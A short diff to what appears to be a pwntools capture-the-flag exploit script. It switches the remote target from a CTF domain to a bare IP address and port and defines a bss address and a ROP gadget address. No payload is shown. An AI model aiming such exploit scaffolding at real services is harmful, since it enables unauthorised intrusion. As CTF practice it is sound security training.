@@ -1,6 +1,7 @@
 from pwn import*
 #p=process('./prove')
-p = remote('ctf2020.sfpwn.ml',4580)
+#p = remote('ctf2020.sfpwn.ml',4580)
+p = remote('35.194.245.237',8085)
 # gadget
 bss = 0x601010+0x300
 RLR = 0x4006B3
